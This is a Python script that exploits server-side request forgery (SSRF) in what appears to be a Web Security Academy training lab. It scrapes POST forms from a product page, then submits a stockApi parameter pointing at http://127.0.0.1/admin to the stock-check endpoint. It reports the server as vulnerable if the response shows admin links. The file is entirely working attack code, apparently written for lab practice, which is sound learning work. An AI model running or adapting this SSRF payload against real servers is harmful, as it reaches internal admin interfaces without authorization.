#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def is_vulnerable(soup):

    links = soup.find_all('a')

    for link in links:
        if "admin" in str(link).lower():
            return True
        
    return False

# Exploit urls
exploit_url = "http://127.0.0.1/admin"

# SSRF Vulnerability tool
home_url = "https://0a4f00b2046572a7c2757f3a00a50064.web-security-academy.net/"
url = "https://0a4f00b2046572a7c2757f3a00a50064.web-security-academy.net/product?productId=2"
r = requests.get(url)

soup = BeautifulSoup(r.text)

# Create a list of all the forms
forms = soup.find_all('form')

post_form = []

# Discover all the post forms
for form in forms:
    # If you find a post form, add it to post_forum list
    if "POST" in form['method'].upper():
        post_form.append(form)

if (post_form):
    for i in range(0,len(post_form)):

        burp0_url = "https://0a4f00b2046572a7c2757f3a00a50064.web-security-academy.net:443/product/stock"
        #burp0_cookies = {"session": "ybJis45qiwvgpNQZOpDrzMtpkG2xGof0"}
        burp0_headers = {
            "Sec-Ch-Ua": "\"Chromium\";v=\"111\", \"Not(A:Brand\";v=\"8\"", 
            "Sec-Ch-Ua-Platform": "\"macOS\"", 
            "Sec-Ch-Ua-Mobile": "?0", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36", 
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*", 
            "Origin": home_url, 
            "Sec-Fetch-Site": "same-origin", 
            "Sec-Fetch-Mode": "cors", 
            "Sec-Fetch-Dest": "empty", 
            "Referer": url, 
            "Accept-Encoding": "gzip, deflate", 
            "Accept-Language": "en-US,en;q=0.9"
            }
        burp0_data = {"stockApi": exploit_url}

        xploit_r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        # check to see if exploit worked
        xploit_soup = BeautifulSoup(xploit_r.text, 'html.parser')

        if is_vulnerable(xploit_soup):
            print("Server is vulnerable to SSRF!")